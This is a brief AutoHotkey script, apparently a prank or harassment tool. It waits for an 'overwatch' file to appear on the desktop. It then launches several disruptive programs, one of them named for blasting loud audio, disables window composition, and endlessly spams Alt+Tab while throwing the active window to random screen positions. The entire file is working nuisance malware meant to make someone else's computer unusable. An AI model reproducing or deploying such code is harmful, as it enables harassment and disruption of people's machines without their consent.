Start:
;F12:: Exit
; SplashTextOn, 600, 20, IMPORTANT SHIT, Overwatch isn't bad but if you aren't gonna buy me one, you can go away!
CheckForFile:
IfExist, %A_Desktop%\*overwatch*.*
Goto, Payload
IfNotExist, %A_Desktop%\*overwatch*.*
Goto, Start
Payload:
Run, checkfile.exe
Run, spamNumCapsScrl.exe
Run, jittermouse.exe
Run, earrape.exe
DllCall("dwmapi\DwmEnableComposition", "uint", 0)
Loop
{
Send {Alt down}
Random, spamkey , 1, 12
loop, %spamkey%
{
Send {Tab}
}
Send {Alt up}
Random, randx, 1, %A_ScreenWidth%
Random, randy, 1, %A_ScreenHeight%
; WinGetPos X, Y, , , A
; X += randx
; Y += randy
WinMove, A, , randx, randy
; WinMove, A, overwatch, randx, randy
Sleep 100
}